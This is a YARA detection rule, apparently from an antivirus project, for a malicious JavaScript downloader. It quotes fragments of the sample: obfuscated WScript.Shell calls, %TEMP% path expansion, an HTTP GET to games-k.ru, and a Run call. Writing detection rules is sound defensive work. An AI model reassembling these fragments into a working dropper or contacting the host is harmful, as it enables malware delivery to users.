rule sig_20160427_db3842604842d05bf5b3129e83387a6b {
  meta:
    description = "datamaliciousorder - file 20160427_db3842604842d05bf5b3129e83387a6b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "09ea0d80d54123132e2f186ac08078b3a795f1601ce575e1f32ecdbc67ee4ed1"

  strings:
    $s1  = "function XstibOefaa() {return EexsqFtiyn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"z7qHHqt" ascii
    $s2  = "function XstibOefaa() {return EexsqFtiyn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"z7qHHqt" ascii
    $s3  = "function XehtmQdopg(AeeqfXjzxu, AbjblHwzxj){SenoiRxyju = SenoiRxyju * 1; return AeeqfXjzxu - AbjblHwzxj;};" fullword ascii
    $s4  = "var EexsqFtiyn = function GwlruOzfep() {return SuhrsExbdk[ArtwmCzzla](\"WScript\"+\".Shell\");}(), SxbteGrvbq = 11;" fullword ascii
    $s5  = "var SuhrsExbdk = this[\"WScript\"];" fullword ascii
    $s6  = "function FcwfxFnqtk(){return DyyhiNjfsi + \"\";};" fullword ascii
    $s7  = "KgktaNcarh[SkmzdTfpwa](\"G\" + \"ET\", \"http://games-k.ru/n8eis\", false);" fullword ascii
    $s8  = "function ZaunnZqtej() {return ((TjfvgOdjja == true) && (TjfvgOdjja == XutuxMcjrx)) ? 1 : SenoiRxyju;};" fullword ascii
    $s9  = "function RjyfrOuumx(YtgntXvrgy){EexsqFtiyn[\"R\"+\"un\"](YtgntXvrgy, SenoiRxyju, SenoiRxyju);};" fullword ascii
    $s10 = "var NyxiuMakru = new this[\"D\"+\"ate\"]();" fullword ascii
    $s11 = "if (KgktaNcarh[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "XutuxMcjrx = true; " fullword ascii
    $s13 = "var XrtlsWmsaf = false;" fullword ascii
    $s14 = "TjfvgOdjja = true; " fullword ascii
    $s15 = "function XmldqJyqmv()" fullword ascii
    $s16 = "XrtlsWmsaf = true;" fullword ascii
    $s17 = "return XehtmQdopg(EugsrLmmil, RqrnbFnbvi);" fullword ascii
    $s18 = "var TjfvgOdjja = false;" fullword ascii
    $s19 = "function SbvkbDvloz(){return 23;};" fullword ascii
    $s20 = "function UxdigNnvbr(){return ArtwmCzzla;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}